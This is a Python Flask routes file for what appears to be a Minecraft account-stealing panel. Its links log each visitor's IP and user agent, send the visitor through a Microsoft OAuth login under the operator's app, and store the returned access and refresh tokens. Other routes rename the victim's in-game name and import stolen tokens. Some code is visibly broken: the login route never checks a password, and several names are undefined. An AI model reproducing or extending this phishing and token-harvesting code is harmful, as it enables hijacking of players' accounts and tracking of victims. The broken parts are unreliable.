from flask import Blueprint, render_template, url_for, redirect, request, send_from_directory, jsonify, abort, flash
from flask_login import login_user, login_required, logout_user, current_user
from app import app, db, bcrypt
from app.forms import CreateLinkForm, ImportAccountForm, EditLinkForm, GenerateTokenForm, RenameMCForm, RegisterForm, LoginForm
from app.models import User, Link, Track, Account
import datetime
from app.test_app_config import test_app_config
from app import mcapi
import time

routes = Blueprint('routes', __name__)

def get_redir(link_id):
    return f"{app.config.get('HOST')}/oauth/{link_id}"

def get_verify_link(link_id):
    return f"{app.config.get('HOST')}/verify/{link_id}"

@routes.route('/favicon.ico')
def favicon():
    return send_from_directory('static/icons', 'icon.ico', mimetype='image/vnd.microsoft.icon')

@app.route("/oauth/<int:link_id>")
def oauth(link_id):
    link = Link.query.get_or_404(link_id)

    code = request.args.get("code", default=None, type=str)
    print(f"user give {code}")
    acc = mcapi.create_acc_by_code(code, link)

    ip = request.remote_addr
    if request.headers.get("X-Forwarded-For"):
        ip = request.headers.get("X-Forwarded-For")

    acc.ip = ip
    acc.ua = request.headers.get("User-Agent", "No UA")

    if not Account.query \
              .filter(Account.owner == db.session.get(Link, link_id).owner) \
              .filter(Account.uuid == acc.uuid) \
              .filter(Account.shadowed == False) \
              .first() or acc.err:
        db.session.add(acc)
        db.session.commit()

    return redirect(link.url_after)

@app.route("/edituser", methods=["GET", "POST"])
@login_required
def edituser():
    generate_new_token = GenerateTokenForm()
    if generate_new_token.validate_on_submit():
        current_user.api_token = secrets.token_urlsafe(
            app.config.get("TOKEN_LEN", 16))

    return render_template("edituser.html", generate_new_token=generate_new_token, current_user=current_user)

@app.route("/verify/<int:link_id>")
def verify_and_send_to_app(link_id):
    link = Link.query.get_or_404(link_id)

    ip = request.remote_addr
    if request.headers.get("X-Forwarded-For", False):
        ip = request.headers.get("X-Forwarded-For")

    track_info = Track(link=link_id, ua=request.headers.get(
        "User-Agent", "No UA"), ip=ip, time=int(time.time()))
    db.session.add(track_info)
    db.session.commit()

    return redirect(mcapi.auth_get_login_url(link.app_id, get_redir(link_id)))

@app.route("/login", methods=["GET", "POST"])
def login():
    form = LoginForm()
    if form.validate_on_submit():
        return redirect(url_for("dashboard"))
    return render_template("login.html", form=form)


@app.route("/dashboard", methods=["GET", "POST"])
@login_required
def dashboard():
    link_form = CreateLinkForm()

    import_acc_form = ImportAccountForm()

    links = Link.query.filter_by(owner=current_user.id).all()

    tracks = Track.query.join(Link, Link.id == Track.link).filter(
        Link.owner == current_user.id).all()[::-1]  # reverse so the first track is the latest

    accs = Account.query \
        .filter(Account.owner == current_user.id) \
        .filter(Account.shadowed == False) \
        .all()

    if link_form.validate_on_submit():
        new_link = Link(name=link_form.name.data,
                        app_id=link_form.app_id.data, url_after=link_form.url_after.data, owner=current_user.id)
        db.session.add(new_link)
        db.session.commit()

    if import_acc_form.validate_on_submit() and not Account.query \
        .filter(Account.owner == current_user.id) \
        .filter(Account.shadowed == False) \
        .filter(Account.refresh_token == import_acc_form.refresh_token.data) \
        .first():
        acc = import_acc(import_acc_form.app_id.data,
                         import_acc_form.refresh_token.data, 
         client_secret = import_acc_form.client_secret.data)
        acc.owner = current_user.id
        if Account.query \
                  .filter(Account.uuid == acc.uuid) \
                  .filter(Account.uuid != None) \
                  .filter(Account.owner == current_user.id) \
                  .filter(Account.shadowed == False) \
                  .first():
            flash("You already imported/got this account", category="error")
        else:
            db.session.add(acc)
            db.session.commit()

    return render_template("dashboard.html", link_form=link_form, 
                                             links=links,
                                             tracks=tracks,
                                             datetime=datetime, 
                                             get_verify_link=get_verify_link, 
                                             get_redir=get_redir, 
                                             accs=accs, 
                                             import_acc_form=import_acc_form)


@app.route("/dashboard/link/<int:link_id>/delete")
@login_required
def delete_link(link_id):
    link = Link.query.get_or_404(link_id)

    # Check if the current user owns the link before allowing deletion
    if link.owner == current_user.id:
        db.session.delete(link)
        db.session.commit()

    return redirect(url_for("dashboard"))


@app.route("/dashboard/link/<int:link_id>/verify")
@login_required
def verify_link(link_id):
    link = Link.query.get_or_404(link_id)

    if "FIREFOXES_RUNNING" not in app.config:
        app.config["FIREFOXES_RUNNING"] = 0

    if app.config.get("MAX_FIRFOX") <= app.config["FIREFOXES_RUNNING"]:
        return jsonify({"is_ratelimit": True})

    if link.owner != current_user.id:
        return jsonify({"udontownthis": True})

    app.config["FIREFOXES_RUNNING"] += 1

    is_valid = test_app_config(
        mcapi.auth_get_login_url(link.app_id, get_redir(link_id)))

    app.config["FIREFOXES_RUNNING"] -= 1

    return jsonify({"is_valid": is_valid})


@app.route("/dashboard/acc/<int:acc_id>/namemc")
@login_required
def namemc(acc_id):
    acc = Account.query.get_or_404(acc_id)

    if acc.owner != current_user.id:
        return jsonify({"udontownthis": True})

    link = token2namemc.wrapper(acc.access_token, acc.name, acc.uuid)
    return jsonify({"link": link})


@app.route("/dashboard/link/<int:link_id>/edit", methods=["GET", "POST"])
@login_required
def edit_link(link_id):
    link = Link.query.get_or_404(link_id)

    if link.owner != current_user.id:
        return redirect(url_for("dashboard"))

    form = EditLinkForm()

    if form.validate_on_submit():
        link.name = form.name.data
        link.app_id = form.app_id.data
        link.url_after = form.url_after.data
        db.session.commit()
        return redirect(url_for("dashboard"))

    form.name.data = link.name
    form.app_id.data = link.app_id
    form.url_after.data = link.url_after

    return render_template("editlink.html", link_form=form)


@app.route("/dashboard/track/clear_all")
@login_required
def delete_all_tracks():
    # there is a a weird warning 
    # app.py:324: SAWarning: Coercing Subquery object into a select() for use in IN(); please pass a select() construct explicitly
    # Track.query.filter(Track.id.in_(subq)).delete(synchronize_session=False)
    # i dunno what this is and iam sorry lol soooo il just leave this...
    # ps it still works even with the warning
    subq = db.session.query(Track.id).join(Link).filter(
        Link.owner == current_user.id).subquery()

    Track.query.filter(Track.id.in_(subq)).delete(synchronize_session=False)
    db.session.commit()

    return redirect(url_for("dashboard"))


@app.route("/dashboard/acc/<int:acc_id>/delete")
@login_required
def delete_acc(acc_id):
    acc = db.session.get(Account, acc_id)
    if acc.owner != current_user.id and not acc.shadowed:
        abort(400)
    acc.shadowed = True
    db.session.commit()
    return redirect(url_for("dashboard"))


@app.route("/dashboard/acc/<int:acc_id>/info")
@login_required
def acc_info(acc_id):
    acc = Account.query.get_or_404(acc_id)
    if acc.owner != current_user.id:
        abort(400)

    rename_form = RenameMCForm()
    if rename_form.validate_on_submit():
        r = mcapi.setName(acc.access_token, rename_form.name.data)
        if r.status_code != 200:
            flash("unable to change name", category="error")
        else:
            flash("changed name", category="message")
            acc.name = rename_form.name.data

    

    return render_template("accountinfo.html", acc=acc, rename_form=rename_form)


@app.route("/logout", methods=["GET", "POST"])
@login_required
def logout():
    logout_user()
    return redirect(url_for("login"))


@app.route("/register", methods=["GET", "POST"])
def register():
    form = RegisterForm()

    if form.validate_on_submit():
        hashed_password = bcrypt.generate_password_hash(form.password.data)
        new_user = User(username=form.username.data, password=hashed_password)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for("login"))

    return render_template("register.html", form=form)

@app.route("/")
def home():
    return render_template("home.html")